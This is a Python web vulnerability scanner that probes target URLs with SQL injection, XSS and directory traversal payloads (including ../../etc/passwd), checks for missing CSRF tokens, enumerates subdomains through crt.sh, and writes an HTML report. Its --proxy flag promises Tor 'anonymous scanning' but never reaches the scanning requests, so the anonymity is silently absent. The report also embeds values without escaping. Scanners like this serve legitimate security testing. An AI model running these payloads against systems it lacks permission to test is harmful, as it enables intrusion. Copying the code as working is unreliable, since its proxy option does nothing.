import requests
import re
import json
import argparse
import socket
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from datetime import datetime
import time
import logging

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

# Enable Tor Proxy Support
def enable_tor_proxy():
    return {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}

def fetch_url(url, use_proxy=False, data=None, method="GET", retries=3):
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    session = requests.Session()
    if use_proxy:
        session.proxies = enable_tor_proxy()
    for attempt in range(retries):
        try:
            if method == "POST":
                response = session.post(url, headers=headers, data=data, timeout=5)
            else:
                response = session.get(url, headers=headers, timeout=5)
            return response.text
        except requests.exceptions.RequestException as e:
            if attempt < retries - 1:
                time.sleep(2 ** attempt)  # Exponential backoff
                logging.warning(f"Retry {attempt + 1}/{retries} for {url}: {e}")
            else:
                logging.error(f"Failed after {retries} attempts: {e}")
                return None

# SQL Injection Scanner
def check_sqli(url):
    payloads = ["' OR 1=1 --", "' OR SLEEP(5)--", "' OR 'a'='a"]
    for payload in payloads:
        new_url = urljoin(url, "?" + payload)
        response = fetch_url(new_url)
        if response and ("sql syntax" in response.lower() or "mysql_fetch" in response.lower()):
            return True
        # Check POST
        response = fetch_url(url, data={"input": payload}, method="POST")
        if response and ("sql syntax" in response.lower() or "mysql_fetch" in response.lower()):
            return True
    return False

# XSS Scanner
def check_xss(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "';alert('XSS');//",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')"
    ]
    for payload in payloads:
        new_url = urljoin(url, "?q=" + payload)
        response = fetch_url(new_url)
        if response and payload in response:
            return True
    return False

# Directory Traversal Scanner
def check_directory_traversal(url):
    common_dirs = ["/etc/passwd", "../../etc/passwd", "../windows/win.ini"]
    for dir_path in common_dirs:
        new_url = urljoin(url, dir_path)
        response = fetch_url(new_url)
        if response and ("root:x:" in response or "[extensions]" in response):
            return True
    return False

# CSRF Scanner
def check_csrf(url):
    response = fetch_url(url)
    if not response:
        return "Error fetching page"
    soup = BeautifulSoup(response, 'html.parser')
    forms = soup.find_all('form')
    if not forms:
        return "No forms found"
    for form in forms:
        if not form.find('input', {'type': 'hidden', 'name': re.compile('csrf|token', re.I)}):
            return "Vulnerable (No CSRF token found)"
    return "Not Vulnerable"

# Subdomain Enumeration
def enumerate_subdomains(domain):
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    response = fetch_url(url)
    subdomains = set()
    if response:
        try:
            data = json.loads(response)
            for entry in data:
                subdomains.add(entry['name_value'])
        except json.JSONDecodeError:
            logging.error("Failed to parse crt.sh JSON response")
    return list(subdomains)

# Generate HTML Report
def generate_report(results, filename="report.html"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    severity = {
        "SQL Injection": "High",
        "XSS": "Medium",
        "Directory Traversal": "High",
        "CSRF": "Medium",
        "Subdomains": "Info"
    }
    report_html = f"""
    <html>
    <head>
        <title>Web Vulnerability Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; }}
            table {{ width: 100%; border-collapse: collapse; }}
            th, td {{ padding: 10px; border: 1px solid black; }}
            .vulnerable {{ color: red; }}
            .not-vulnerable {{ color: green; }}
        </style>
    </head>
    <body>
        <h2>Web Vulnerability Report</h2>
        <p>Generated on: {timestamp}</p>
        <table>
            <tr><th>Test</th><th>Result</th><th>Severity</th></tr>
            {''.join(
                f'<tr><td>{key}</td><td class="{"vulnerable" if "Vulnerable" in value else "not-vulnerable"}">{value}</td><td>{severity.get(key, "N/A")}</td></tr>'
                for key, value in results.items()
            )}
        </table>
    </body>
    </html>
    """
    with open(filename, "w") as file:
        file.write(report_html)
    logging.info(f"Report saved as {filename}")

# Scan a single URL
def scan_url(url, use_proxy=False, check_subdomains=False, check_csrf_flag=False):
    results = {}
    logging.info(f"Scanning {url}...")
    
    logging.info("Scanning for SQL Injection...")
    results["SQL Injection"] = "Vulnerable" if check_sqli(url) else "Not Vulnerable"
    
    logging.info("Scanning for XSS...")
    results["XSS"] = "Vulnerable" if check_xss(url) else "Not Vulnerable"
    
    logging.info("Checking for Directory Traversal...")
    results["Directory Traversal"] = "Vulnerable" if check_directory_traversal(url) else "Not Vulnerable"
    
    if check_csrf_flag:
        logging.info("Checking for CSRF...")
        results["CSRF"] = check_csrf(url)
    
    if check_subdomains:
        logging.info("Enumerating subdomains...")
        domain = url.split("://")[-1].split("/")[0]
        subdomains = enumerate_subdomains(domain)
        results["Subdomains"] = ", ".join(subdomains) if subdomains else "None Found"
    
    return results

# Main Function with CLI
def main():
    parser = argparse.ArgumentParser(description="Enhanced Web Vulnerability Scanner")
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("--proxy", action="store_true", help="Use Tor for anonymous scanning")
    parser.add_argument("--subdomains", action="store_true", help="Perform subdomain enumeration")
    parser.add_argument("--csrf", action="store_true", help="Check for CSRF vulnerabilities")
    parser.add_argument("--file", help="File with list of URLs to scan")
    args = parser.parse_args()

    if args.file:
        with open(args.file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        for url in urls:
            results = scan_url(url, args.proxy, args.subdomains, args.csrf)
            filename = f"report_{url.replace('://', '_').replace('/', '_')}.html"
            generate_report(results, filename)
    else:
        results = scan_url(args.url, args.proxy, args.subdomains, args.csrf)
        generate_report(results)

if __name__ == "__main__":
    main()